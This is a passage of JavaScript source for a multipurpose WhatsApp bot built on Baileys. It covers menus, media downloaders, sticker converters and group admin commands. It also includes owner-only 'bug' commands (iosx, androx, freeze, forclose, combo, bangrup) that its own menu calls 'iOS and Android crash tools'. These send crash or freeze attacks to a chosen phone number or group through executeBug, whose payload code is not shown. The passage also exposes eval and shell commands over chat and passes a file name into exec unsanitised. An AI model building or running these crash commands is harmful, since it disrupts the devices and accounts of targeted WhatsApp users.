            },
            {
              title: "Owner Management",
              rows: [
                { title: "Add Owner", description: "Add new owner: .addowner <number>", id: ".addowner" },
                { title: "Del Owner", description: "Remove owner: .delowner <number>", id: ".delowner" },
              ],
            },
            {
              title: "Profile & Group",
              rows: [
                { title: "Set PP Bot", description: "Set bot profile picture", id: ".setppbot" },
                { title: "Set Bio Bot", description: "Set bot bio", id: ".setbiobot" },
                { title: "Block List", description: "View blocked numbers", id: ".blocklist" },
              ],
            },
          ],
          ctaButtons: [{ text: "telegram owner", url: MENU_OWNER }],
          quickButtons: [
            { text: "← Back", id: ".menu" },
            { text: "All Menu", id: ".allmenu" },
          ],
        });
      }
      break;

      // ═══════════════════════════════════════════════════════════
      // SUBMENU: ABOUT
      // ═══════════════════════════════════════════════════════════
      case "about": {
        await fancyMenu(sock, m.chat, m, {
          channelUrl: MENU_CHANNEL,
          copyCode: "ABOUT-BOT",
          topBanner: "╭────────「  A B O U T  」────────╮",
          midBanner: "╭────────「  I N F O  」────────╮",
          dropdownTitle: "A B O U T - B O T",
          bodyText: `┌ ${MENU_BOT_NAME} v${MENU_BOT_VERSION}
│
│  Hai ${m.pushName}
│
├ Information
│  › WhatsApp multipurpose bot
│  › Built with Baileys engine
│
├ Note
│  › Use responsibly
│  › Developer not responsible for misuse
│
├ Contact
│  › t.me/bilal_babar_982
│  › t.me/arigandhizyy`,
          footerText: `© ${MENU_FOOTER}`,
          sections: [
            {
              title: "Contact",
              highlight_label: "Get in touch",
              rows: [
                { title: "Channel Telegram", description: "Official channel", id: ".menu" },
                { title: "Telegram Owner", description: "Contact owner", id: ".menu" },
              ],
            },
          ],
          ctaButtons: [
            { text: "channel telegram", url: MENU_CHANNEL },
            { text: "telegram owner", url: MENU_OWNER },
          ],
          quickButtons: [
            { text: "← Back", id: ".menu" },
            { text: "All Menu", id: ".allmenu" },
          ],
        });
      }
      break;

      // ═══════════════════════════════════════════════════════════
      // SUBMENU: ALL (navigation hub)
      // ═══════════════════════════════════════════════════════════
      case "allmenu": {
        await fancyMenu(sock, m.chat, m, {
          channelUrl: MENU_CHANNEL,
          copyCode: "ALL-MENU",
          topBanner: "╭────────「  A L L  」────────╮",
          midBanner: "╭────────「  M E N U  」────────╮",
          dropdownTitle: "A L L - S E C T I O N S",
          bodyText: `┌ A L L  M E N U
│
│  Navigate all categories
│
├ Bug Tools
├ Info Tools
├ Owner Tools
├ Group Control
├ Downloader
├ AI Tools
├ Convert / Media
├ Utility / Dev`,
          footerText: `© ${MENU_FOOTER}`,
          sections: [
            {
              title: "Bug & Info",
              highlight_label: "Quick Access",
              rows: [
                { title: "Bug Menu", description: "iOS and Android crash tools", id: ".bugmenu" },
                { title: "Info Tools", description: "Ping, To LID, Sen", id: ".infomenu" },
              ],
            },
            {
              title: "Owner & Group",
              rows: [
                { title: "Owner Tools", description: "Owner only commands", id: ".ownermenu" },
                { title: "Group Control", description: "Group management commands", id: ".cat_group" },
              ],
            },
            {
              title: "Download & AI",
              rows: [
                { title: "Downloader", description: "YouTube, TikTok, GDrive", id: ".cat_download" },
                { title: "AI Tools", description: "Image, Chat, GPT", id: ".cat_ai" },
              ],
            },
            {
              title: "Convert & Dev",
              rows: [
                { title: "Convert / Media", description: "Sticker, TTS, QR, etc", id: ".cat_convert" },
                { title: "Utility / Dev", description: "Eval and shell commands", id: ".cat_dev" },
              ],
            },
          ],
          ctaButtons: [{ text: "channel telegram", url: MENU_CHANNEL }],
          quickButtons: [{ text: "← Back", id: ".menu" }],
        });
      }
      break;

      // ═══════════════════════════════════════════════════════════
      // CATEGORY SUBMENUS (photo + text + back buttons)
      // ═══════════════════════════════════════════════════════════
      case "cat_group": {
        let cap = buildMenuCaption("G R O U P  C O N T R O L", "Group management", [
          [
            "Commands",
            [
              "setppgc",
              "editgroupname <text>",
              "editgroupdescription <text>",
              "linkgc",
              "revoke",
              "kick <@user>",
              "add <number>",
              "promote <@user>",
              "demote <@user>",
              "hidetag <text>",
              "tagall <text>",
            ],
          ],
        ]);
        await sendPhotoMenu(sock, m.chat, m, {
          caption: cap,
          buttons: [
            { text: "← Back to All", id: ".allmenu" },
            { text: "Main Menu", id: ".menu" },
          ],
        });
      }
      break;

      case "cat_download": {
        let cap = buildMenuCaption("D O W N L O A D E R", "Media downloader", [
          [
            "Commands",
            [
              "ytmp3 <url>",
              "ytmp4 <url>",
              "play <title>",
              "ttsearch <title>",
              "gitclone <url>",
              "gdrive <url>",
              "tiktok <url>",
              "ttmp3 <url>",
            ],
          ],
        ]);
        await sendPhotoMenu(sock, m.chat, m, {
          caption: cap,
          buttons: [
            { text: "← Back to All", id: ".allmenu" },
            { text: "Main Menu", id: ".menu" },
          ],
        });
      }
      break;

      case "cat_ai": {
        let cap = buildMenuCaption("A I  T O O L S", "Artificial intelligence", [
          [
            "Commands",
            [
              "aigen <prompt>  — AI Image",
              "aichat <text>  — Venice AI",
              "gptai <text>  — ChatGPT",
            ],
          ],
        ]);
        await sendPhotoMenu(sock, m.chat, m, {
          caption: cap,
          buttons: [
            { text: "← Back to All", id: ".allmenu" },
            { text: "Main Menu", id: ".menu" },
          ],
        });
      }
      break;

      case "cat_convert": {
        let cap = buildMenuCaption("C O N V E R T  /  M E D I A", "Convert tools", [
          [
            "Commands",
            [
              "sticker",
              "smeme <top|bottom>",
              "toimg",
              "tomp4",
              "tts <lang> <text>",
              "attp <text>",
              "textmaker <text>",
              "ttq <text>",
              "short <url>",
              "ttes <text>",
              "tta <text>",
              "tourl <url>",
            ],
          ],
        ]);
        await sendPhotoMenu(sock, m.chat, m, {
          caption: cap,
          buttons: [
            { text: "← Back to All", id: ".allmenu" },
            { text: "Main Menu", id: ".menu" },
          ],
        });
      }
      break;

      case "cat_dev": {
        let cap = buildMenuCaption("U T I L I T Y  /  D E V", "Developer tools", [
          [
            "Commands",
            [
              "> (code async)",
              "< (code sync)",
              "$ (shell command)",
            ],
          ],
          ["Note", ["Owner only", "Use carefully"]],
        ]);
        await sendPhotoMenu(sock, m.chat, m, {
          caption: cap,
          buttons: [
            { text: "← Back to All", id: ".allmenu" },
            { text: "Main Menu", id: ".menu" },
          ],
        });
      }
      break;

      // ═══════════════════════════════════════════════════════════
      // BUG COMMAND HANDLERS
      // ═══════════════════════════════════════════════════════════
      case "iosx":
      case "androx":
      case "delay":
      case "freeze":
      case "forclose":
      case "blank":
      case "combo": {
        if (!isCreator) return m.reply(`Access denied\n\n© ${MENU_FOOTER}`);
        if (!q) {
          return m.reply(
            `┌ Format: ${prefix}${command} <number>\n│\n│  Example: ${prefix}${command} 628123456789\n\n© ${MENU_FOOTER}`,
          );
        }
        const rawNumber = q.replace(/[^0-9]/g, "");
        if (!/^\d{7,15}$/.test(rawNumber)) {
          return m.reply(`┌ Invalid number\n│\n│  Example: ${prefix}${command} 628123456789\n\n© ${MENU_FOOTER}`);
        }
        if (rawNumber.startsWith("0")) {
          return m.reply(`┌ Use country code\n│\n│  Example: 628123456789\n\n© ${MENU_FOOTER}`);
        }
        const target = rawNumber + "@s.whatsapp.net";
        await executeBug(sock, m, { command, target, rawNumber });
      }
      break;

      // ═══════════════════════════════════════════════════════════
      // GROUP BUG COMMAND HANDLERS
      // ═══════════════════════════════════════════════════════════
      case "grup":
      case "bangrup": {
        if (!isCreator) return m.reply(`Access denied\n\n© ${MENU_FOOTER}`);
        if (!q) {
          return m.reply(
            `┌ Format: ${prefix}${command} <link grup / JID>\n│\n│  Example: ${prefix}${command} https://chat.whatsapp.com/xxxxx\n│  Example: ${prefix}${command} 123456789-987654321@g.us\n\n© ${MENU_FOOTER}`,
          );
        }
        const groupJid = await resolveGroupJid(sock, q);
        if (!groupJid) {
          return m.reply(
            `┌ Invalid group\n│\n│  Pastikan link grup valid atau JID berakhiran @g.us\n\n© ${MENU_FOOTER}`,
          );
        }
        await executeBug(sock, m, { command, target: groupJid, rawNumber: groupJid });
      }
      break;

      // ═══════════════════════════════════════════════════════════
      // INFO / USER COMMANDS
      // ═══════════════════════════════════════════════════════════
      case "lol": {
        m.reply("lol");
      }
      break;

      case "tolid": {
        let p = await sock.toLid(m.chat);
        await m.reply(p);
      }
      break;

      case "sen": {
        let p = m.sender;
        await m.reply(p);
      }
      break;

      case "public": {
        if (!isCreator) return m.reply(mess.owner);
        botset.mode = "public";
        fs.writeFileSync(mwmek, JSON.stringify(botset));
        m.reply(`Mode changed to *PUBLIC*\n\n© ${MENU_FOOTER}`);
      }
      break;

      case "self": {
        if (!isCreator) return m.reply(mess.owner);
        botset.mode = "self";
        fs.writeFileSync(mwmek, JSON.stringify(botset));
        m.reply(`Mode changed to *SELF*\n\n© ${MENU_FOOTER}`);
      }
      break;

      case "owner": {
        let namaown = `arigandhizyy`;
        let nomor = "6283121227272";
        var contact = generateWAMessageFromContent(
          m.chat,
          proto.Message.fromObject({
            contactMessage: {
              displayName: `${namaown}`,
              vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${nomor}:+${nomor}\nitem1.m.chat-ABLabel:Mobile\nm.chat-WA-BIZ-DESCRIPTION:arigandhizyy\nm.chat-WA-BIZ-NAME: [[arigandhizyy! ]]\nEND:VCARD`,
            },
            contextInfo: {
              mentionedJid: [m.chat],
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              forwardingScore: 99999,
              isForwarded: true,
              externalAdReply: {
                showAdAttribution: false,
                title: "arigandhizyy",
                body: "what's interesting about me?.",
                thumbnailUrl: "https://files.catbox.moe/4cgjwi.jpg",
                sourceUrl: "https://tama-portfolio.vercel.app/",
                mediaType: 1,
                sockderLargerThumbnail: true,
              },
            },
          }),
          { userJid: m.chat, quoted: m },
        );
        await sock.relayMessage(m.chat, contact.message, { messageId: contact.key.id });
      }
      break;

      case "addowner": {
        if (!isCreator) return;
        if (!q)
          return m.reply(`Usage: ${prefix + command} <number>\nExample: ${prefix + command} 62895350011678`);
        const prem = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const cek = await sock.onWhatsApp(prem);
        if (cek.length === 0) return m.reply("Enter a valid phone number registered on WhatsApp.");
        if (kontributor.some(ownerJid => areJidsSameUser(ownerJid, prem))) {
          return m.reply(`${prem} is already in the contributor list.`);
        }
        kontributor.push(prem);
        fs.writeFileSync(ownersPath, JSON.stringify(kontributor, null, 2));
        m.reply(`${prem} has been added as a contributor.`);
        sock.sendMessage(
          prem,
          {
            image: { url: `https://telegra.ph/file/4591e4839848523095e05.jpg` },
            caption: `You are now a bot owner/contributor.`,
          },
          { quoted: null },
        );
      }
      break;

      case "delowner": {
        if (!isCreator) return;
        if (!q)
          return m.reply(`Usage: ${prefix + command} <number>\nExample: ${prefix + command} 62895350011678`);
        let prem = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        if ([botJid, sock.authState.creds.me?.lid].some(ownerJid =>
          ownerJid && areJidsSameUser(prem, ownerJid),
        )) return m.reply("The paired WhatsApp number must remain an owner of its own bot.");
        const ownerIndex = kontributor.findIndex(ownerJid => areJidsSameUser(ownerJid, prem));
        if (ownerIndex === -1) return m.reply(`${prem} is not in the contributor list.`);
        kontributor.splice(ownerIndex, 1);
        fs.writeFileSync(ownersPath, JSON.stringify(kontributor, null, 2));
        m.reply(`${prem} has been removed from the contributor list.`);
      }
      break;

      case "sticker":
      case "stiker":
      case "s": {
        if (!m.quoted) return m.reply(`Reply to an image or video with the caption ${prefix + command}.`);
        m.reply(mess.wait);
        if (/image/.test(mime)) {
          let media = await quoted.download();
          let encmedia = await sock.sendImageAsSticker(m.chat, media, m, {
            packname: global.packname, author: global.author,
          });
        } else if (/video/.test(mime)) {
          if ((quoted.reply || quoted).seconds > 11) return m.reply("The maximum video length is 10 seconds.");
          let media = await quoted.download();
          let encmedia = await sock.sendVideoAsSticker(m.chat, media, m, {
            packname: global.packname, author: global.author,
          });
          await fs.unlinkSync("./" + encmedia);
        } else {
          return m.reply(`Send an image or video with the caption ${prefix + command}.\nVideo length: 1-9 seconds.`);
        }
      }
      break;

      case "smeme": {
        if (!text || !quoted || !/image/.test(mime))
          return m.reply(`Reply to an image with the caption ${prefix + command} <text 1>|<text 2>.`);
        m.reply(mess.wait);
        let atas = text.split("|")[0] || "-";
        let bawah = text.split("|")[1] || "-";
        try {
          let dwnld = await sock.downloadAndSaveMediaMessage(qmsg);
          let Bjirka = await UguuSe(fs.readFileSync(dwnld));
          let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${Bjirka.url}`;
          let pop = await sock.sendImageAsSticker(m.chat, smeme, m, {
            packname: global.packname, author: global.author,
          });
        } catch (error) {
          console.error(error);
          m.reply("An error occurred while creating the meme.");
        }
        await fs.unlinkSync("./" + dwnld);
      }
      break;

      case "toimage":
      case "toimg": {
        if (!/webp/.test(mime)) return m.reply(`Reply to a sticker with the caption *${prefix + command}*.`);
        m.reply(mess.wait);
        let media = await sock.downloadAndSaveMediaMessage(qmsg);
        let ran = await getRandom(".png");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return err;
          let buffer = fs.readFileSync(ran);
          sock.sendMessage(m.chat, { image: buffer }, { quoted: m });
          fs.unlinkSync("./" + ran);
        });
      }
      break;

      case "tomp4":
      case "tovideo": {
        if (!/webp/.test(mime)) return m.reply(`Reply to a sticker with the caption *${prefix + command}*.`);
        m.reply(mess.wait);
        let media = await sock.downloadAndSaveMediaMessage(qmsg);
        let webpToMp4 = await webp2mp4File(fs.readFileSync(media));
        await sock.sendMessage(m.chat, { video: webpToMp4, caption: "Convert WebP to video" }, { quoted: m });
        await fs.unlinkSync("./" + media);
      }
      break;

      case "tiktok":
      case "tt": {
        if (!q) return m.reply(`Usage: ${prefix + command} <TikTok video URL>`);
        m.reply("Downloading TikTok video...");
        try {
          let res = await tiktokDownloaderVideo(q);
          if (!res || !res.data) return m.reply("Unable to process this link.");
          let noWM =
            res.data.find((x) => x.type === "nowatermark_hd")?.url ||
            res.data.find((x) => x.type === "nowatermark")?.url;
          if (noWM) {
            await sock.sendMessage(m.chat, {
              video: { url: noWM },
              caption: `Download complete\n\n${res.title}\n${res.author.nickname}`,
            }, { quoted: m });
          } else {
            m.reply("No video was found.");
          }
        } catch (err) {
          console.error(err);
          m.reply("Failed to retrieve data from TikTok.");
        }
      }
      break;

      case "ttmp3": {
        if (!q) return m.reply("Enter a TikTok video URL.");
        m.reply("Fetching TikTok audio...");
        try {
          let res = await tiktokDownloaderVideo(q);
          if (!res?.music_info?.url) return m.reply("No audio is available.");
          let title = res.music_info.title || "Unknown Audio";
          await sock.sendMessage(m.chat, {
            audio: { url: res.music_info.url },
            mimetype: "audio/mpeg",
            ptt: false,
            fileName: `${title}.mp3`,
          }, { quoted: m });
        } catch (e) {
          console.error(e);
          m.reply("An error occurred while fetching TikTok audio.");
        }
      }
      break;

      case "ttsearch": {
        if (!q) return m.reply(`Usage: ${prefix + command} <keyword>`);
        try {
          let [kw, pg] = q.split("|");
          let query = pg ? kw : q, page = pg ? parseInt(pg) : 1;
          if (!global.ttCache) global.ttCache = {};
          if (!global.ttCache[m.sender] || global.ttCache[m.sender].query !== query) {
            m.reply("Searching TikTok...");
            let res = await tiktokSearchVideo(query);
            if (!res?.videos?.length) return m.reply("No results found.");
            global.ttCache[m.sender] = { query, videos: res.videos };
          }
          let data = global.ttCache[m.sender];
          let start = (page - 1) * 7, end = start + 7;
          let list = data.videos.slice(start, end);
          let cards = [];
          for (let v of list) {
            let coverUrl = v.cover.startsWith("http") ? v.cover : `https://tikwm.com${v.cover}`;
            let playUrl = v.play.startsWith("http") ? v.play : `https://tikwm.com${v.play}`;
            let musicUrl = v.music.startsWith("http") ? v.music : `https://tikwm.com${v.music}`;
            cards.push({
              image: { url: coverUrl },
              title: v.title?.slice(0, 60) || "Untitled",
              body: `${v.author?.unique_id || "Unknown"} | ${v.digg_count.toLocaleString()} likes`,
              footer: `Duration: ${v.duration}s`,
              buttons: [
                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Download Video", id: `.tiktok ${playUrl}` }) },
                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Download MP3", id: `.ttmp3 ${musicUrl}` }) },
              ],
            });
          }
          if (data.videos.length > end) {
            cards.push({
              image: { url: "https://cdn-icons-png.flaticon.com/512/4315/4315445.png" },
              title: "Next page",
              body: `Show the next results (${page + 1})`,
              footer: "Click the button below to continue",
              buttons: [{ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Next Page", id: `.ttsearch ${query}|${page + 1}` }) }],
            });
          }
          await sock.sendMessage(m.chat, {
            text: `TikTok results for: ${query}`,
            title: "TikTok Search",
            subtitle: `Page ${page}`,
            footer: `Showing ${list.length} of ${data.videos.length} results.`,
            cards,
          }, { quoted: m });
        } catch (e) {
          console.error(e);
          m.reply("Failed to search TikTok.");
        }
      }
      break;

      case "gdrive":
      case "drive": {
        if (!q) return m.reply(`Usage: ${prefix + command} <link Google Drive>`);
        m.reply("Fetching the file from Google Drive...");
        try {
          const data = await GDrive(q);
          if (!data || !data.downloadUrl) return m.reply("Unable to retrieve the download link.");
          await sock.sendMessage(m.chat, {
            document: { url: data.downloadUrl },
            fileName: data.fileName,
            mimetype: data.mimetype,
          }, { quoted: m });
          m.reply(`File: ${data.fileName}\nSize: ${data.fileSize}\nType: ${data.mimetype}`);
        } catch (err) {
          console.error(err);
          m.reply("Failed to retrieve the file from Google Drive.");
        }
      }
      break;

      case "git":
      case "gitclone": {
        if (!args[0]) return m.reply(`Where is the link?\nExample:\n${prefix}${command} https://github.com/YukiShima4/tes`);
        if (!isUrl(args[0]) && !args[0].includes("github.com")) return m.reply("Invalid link!");
        let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
        let [, user, repo] = args[0].match(regex1) || [];
        repo = repo.replace(/.git$/, "");
        let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
        let filename = (await fetch(url, { method: "HEAD" })).headers.get("content-disposition").match(/attachment; filename=(.*)/)[1];
        sock.sendMessage(m.chat, { document: { url }, fileName: filename + ".zip", mimetype: "application/zip" }, { quoted: m }).catch((err) => m.reply("Error!"));
      }
      break;

      case "tourl": {
        if (!quoted || !/image/.test(mime)) return m.reply(`Reply to an image with the text ${prefix + command}.`);
        let dwnld = await sock.downloadAndSaveMediaMessage(qmsg);
        try {
          let Bjirka = await UguuSe(fs.readFileSync(dwnld));
          await m.reply(Bjirka.url);
        } catch (e) {
          console.error(e);
          m.reply("Failed to process the image.");
        }
      }
      break;

      case "tts": {
        if (!q) return m.reply("Usage: .tts <language_code> <text>");
        let lang = args[0] || "id";
        let txt = args.slice(1).join(" ");
        if (!txt) return m.reply("Text cannot be empty.");
        let url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(txt)}&tl=${lang}&client=tw-ob`;
        let buff = await getBuffer(url);
        await sock.sendMessage(m.chat, { audio: buff, ptt: true }, { quoted: m });
      }
      break;

      case "textmaker": {
        if (!q) return m.reply("Usage: .textmaker <text>");
        let txt = encodeURIComponent(q);
        let url = `https://api.memegen.link/images/custom/${txt}.png?background=https://placehold.co/800x400/111/fff`;
        let buff = await getBuffer(url);
        await sock.sendImageAsSticker(m.chat, buff, m, { packname: global.packname, author: global.author });
      }
      break;

      case "attp": {
        if (!q) return m.reply("Usage: .attp <text>");
        let txt = encodeURIComponent(q);
        let url = `https://api.xteam.xyz/attp?file&text=${txt}`;
        let buff = await getBuffer(url);
        await sock.sendImageAsSticker(m.chat, buff, m, { packname: global.packname, author: global.author });
      }
      break;

      case "ttq": {
        if (!q) return m.reply("Usage: .ttq <text>");
        let data = encodeURIComponent(q);
        let url = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${data}`;
        let buff = await getBuffer(url);
        await sock.sendImageAsSticker(m.chat, buff, m, { packname: global.packname, author: global.author });
      }
      break;

      case "ttes": {
        if (!q) return m.reply("Usage: .ttes <text>");
        let out = "";
        for (let ch of q) {
          let code = ch.charCodeAt(0).toString(16).toUpperCase();
          while (code.length < 4) code = "0" + code;
          out += "\\u" + code;
        }
        m.reply(out);
      }
      break;

      case "tta": {
        if (!q) return m.reply("Usage: .tta <text>");
        m.reply("```" + Array.from(text, (char) => char.charCodeAt(0)).join(", ") + "```");
      }
      break;

      case "short":
      case "shorturl": {
        if (!q) return m.reply("Usage: .short <url>");
        let u = q.split(" ")[0];
        if (!isUrl(u)) return m.reply("Invalid URL.");
        let api = `https://tinyurl.com/api-create.php?url=${encodeURIComponent(u)}`;
        let short = await fetch(api).then((r) => r.text()).catch((_) => null);
        if (!short) return m.reply("Failed to shorten the URL.");
        m.reply(`Short URL:\n${short}`);
      }
      break;

      case "join": {
        if (!isOwner) return;
        if (!text) return m.reply("Enter a group link.");
        if (!isUrl(args[0]) && !args[0].includes("whatsapp.com")) return "Invalid link.";
        m.reply(mess.wait);
        let result = args[0].split("https://chat.whatsapp.com/")[1];
        await sock.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)));
      }
      break;

      case "block": {
        if (!isOwner) return;
        await sock.react(m, "🕑");
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        users = users || m.chat;
        if (users.includes("@g.us")) return m.reply("Group IDs (@g.us) are not supported here.");
        await sock.updateBlockStatus(users, "block").then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)));
        await sock.react(m, "✅");
      }
      break;

      case "unblock": {
        if (!isOwner) return;
        let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        if (isGroup) {
          if (users) {
            await sock.updateBlockStatus(users, "unblock");
            await m.reply("User unblocked successfully.");
          } else if (!q) {
            m.reply("Reply to a message, mention a user, or enter the phone number to unblock.");
          }
        } else if (!isGroup) {
          if (q) {
            let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`;
            if (woke.startsWith("08")) return m.reply("Start the phone number with 62.");
            if (!woke.startsWith("62")) return m.reply("Reply to a message, mention a user, or enter the phone number to unblock.");
            await sock.updateBlockStatus(woke, "unblock");
            m.reply(`Successfully unblocked ${woke}.`);
          } else if (!q) {
            m.reply("Enter the phone number you want to unblock.");
          }
        }
      }
      break;

      case "listblock":
      case "blocklist": {
        let block = await sock.fetchBlocklist();
        m.reply("Block list:\n\n" + `Total: ${block == undefined ? "*0* blocked" : "*" + block.length + "* blocked"}\n` + block.map((v) => "• " + v.replace(/@.+/, "")).join`\n`);
      }
      break;

      case "setppbot": {
        if (!isOwner) return;
        await sock.react(m, "🕑");
        if (m.quoted) {
          const media = await sock.downloadAndSaveMediaMessage(quoted);
          const { img } = await generateProfilePicture(media);
          await sock.query({
            tag: "iq",
            attrs: { to: "@s.whatsapp.net", type: "set", xmlns: "w:profile:picture" },
            content: [{ tag: "picture", attrs: { type: "image" }, content: img }],
          });
          await m.reply("Successfully updated the bot profile picture.");
          await m.reply(`${mess.success}`);
          await sock.react(m, "✅");
        } else m.reply("Reply to an image.");
      }
      break;

      case "delppbot": {
        if (!isOwner) return;
        sock.removeProfilePicture(sock.user.id);
        m.reply(mess.succes);
      }
      break;

      case "setbiobot": {
        if (!isOwner) return;
        if (!q) return m.reply(`Use the command ${prefix + command} <name>\n\nExample: ${command} My Bot`);
        await sock.updateProfileStatus(q);
        await m.reply(`Successfully changed the bio to *${q}*.`);
      }
      break;

      case "leavegc":
      case "leavegroup": {
        if (!isOwner) return;
        if (!isGroup) return;
        await sock.groupLeave(m.chat);
      }
      break;

      case "setppgroup":
      case "setppgrup":
      case "setppgc": {
        if (!isOwner) return m.reply(mess.usingsetpp);
        if (!isGroup) return m.reply(mess.ingroup);
        await sock.react(m, "🕑");
        if (!isAdmins) return m.reply(mess.admin);
        if (!/image/.test(mime)) return m.reply(`Send or reply to an image with the caption ${prefix + command}.`);
        if (/webp/.test(mime)) return m.reply(`Send or reply to an image with the caption ${prefix + command}.`);
        let media = await sock.downloadAndSaveMediaMessage(m);
        await sock.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media));
        m.reply("Done.");
        await sock.react(m, "✅");
      }
      break;

      case "editsubjek":
      case "editgroupname": {
        if (!isGroup) return m.reply(mess.ingroup);
        if (!isBotAdmins) return m.reply(mess.notadmin);
        if (!q) return m.reply(`Example: *${prefix + command} New group name*`);
        await sock.react(m, "🕑");
        await sock.groupUpdateSubject(m.chat, text);
        await sock.react(m, "✅");
      }
      break;

      case "editdesk":
      case "editgroupdescription": {
        if (!isGroup) return m.reply(mess.ingroup);
        if (!isBotAdmins) return m.reply(mess.notadmin);
        if (!q) return m.reply(`Example: *${prefix + command} New group description*`);
        await sock.react(m, "🕑");
        await sock.groupUpdateDescription(m.chat, text);
        await sock.react(m, "✅");
      }
      break;

      case "linkgroup":
      case "linkgc": {
        if (!isGroup) return m.reply(mess.ingroup);
        if (!isBotAdmins) return m.reply(mess.notadmin);
        await sock.react(m, "🕑");
        let response = await sock.groupInviteCode(m.chat);
        sock.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link: ${groupMetadata.subject}`, m, { detectLink: true });
        await sock.react(m, "✅");
      }
      break;

      case "resetlinkgc":
      case "revoke": {
        if (!isGroup) return m.reply(mess.ingroup);
        if (!isBotAdmins) return m.reply(mess.notadmin);
        await sock.react(m, "🕑");
        sock.groupRevokeInvite(m.chat);
        await sock.react(m, "✅");
      }
      break;

      case "kick": {
        if (!isGroup) return m.reply(mess.ingroup);
        if (!isBotAdmins) return m.reply(mess.notadmin);
        if (!isAdmins) return m.reply(mess.admin);
        await sock.react(m, "🕑");
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await sock.groupParticipantsUpdate(m.chat, [users], "remove");
        m.reply(mess.done);
        await sock.react(m, "✅");
      }
      break;

      case "add": {
        if (!isGroup) return m.reply(mess.ingroup);
        if (!isBotAdmins) return m.reply(mess.notadmin);
        if (!isAdmins) return m.reply(mess.admin);
        await sock.react(m, "🕑");
        let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await sock.groupParticipantsUpdate(m.chat, [users], "add");
        m.reply(mess.done);
        await sock.react(m, "✅");
      }
      break;

      case "promote": {
        if (!isGroup) return m.reply(mess.ingroup);
        if (!isBotAdmins) return m.reply(mess.notadmin);
        if (!isAdmins) return m.reply(mess.admin);
        await sock.react(m, "🕑");
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await sock.groupParticipantsUpdate(m.chat, [users], "promote");
        m.reply(mess.done);
        await sock.react(m, "✅");
      }
      break;

      case "demote": {
        if (!isGroup) return m.reply(mess.ingroup);
        if (!isBotAdmins) return m.reply(mess.notadmin);
        if (!isAdmins) return m.reply(mess.admin);
        await sock.react(m, "🕑");
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await sock.groupParticipantsUpdate(m.chat, [users], "demote");
        m.reply(mess.done);
        await sock.react(m, "✅");
      }
      break;

      case "hidetag": {
        if (!q) return m.reply(`Enter some text.\nExample: ${command} hello`);
        if (!isGroup) return m.reply(mess.ingroup);
        if (!isBotAdmins) return m.reply(mess.notadmin);
        if (!isAdmins) return m.reply(mess.admin);
        await sock.react(m, "🕑");
        sock.sendMessage(m.chat, { text: q ? q : "", mentions: participants.map((a) => a.id) }, { quoted: m });
        await sock.react(m, "✅");
      }
      break;

      case "tagall": {
        if (!q) return m.reply(`Enter some text.\nExample: ${command} hello`);
        if (!isGroup) return m.reply(mess.ingroup);
        if (!isAdmins) return m.reply(mess.admin);
        await sock.react(m, "🕑");
        let teks = `─── Tag All ───\n\nMessage: ${q ? q : "empty"}\n\n`;
        for (let mem of participants) teks += `@${mem.id.split("@")[0]}\n`;
        sock.sendMessage(m.chat, { text: teks, mentions: participants.map((a) => a.id) }, { quoted: m });
        await sock.react(m, "✅");
      }
      break;

      case "ping": {
        try {
          let start = new Date();
          let msg = await m.reply("Testing...");
          for (let i = 1; i <= 10; i++) await m.reply(`Test Ping (${i}/10)`);
          let latency = new Date() - start;
          await sock.sendMessage(m.chat, { text: `Pong! ${latency}ms` }, { quoted: msg });
          let cpus = os.cpus().map((cpu) => {
            cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
            return cpu;
          });
          let cpu = cpus.reduce((last, cpu, _, { length }) => {
            last.total += cpu.total;
            last.speed += cpu.speed / length;
            last.times.user += cpu.times.user;
            last.times.nice += cpu.times.nice;
            last.times.sys += cpu.times.sys;
            last.times.idle += cpu.times.idle;
            last.times.irq += cpu.times.irq;
            return last;
          }, { speed: 0, total: 0, times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 } });
          let latensi = performance.now() - performance.now();
          let osInfo = await nou.os.oos();
          let storage = await nou.drive.info();
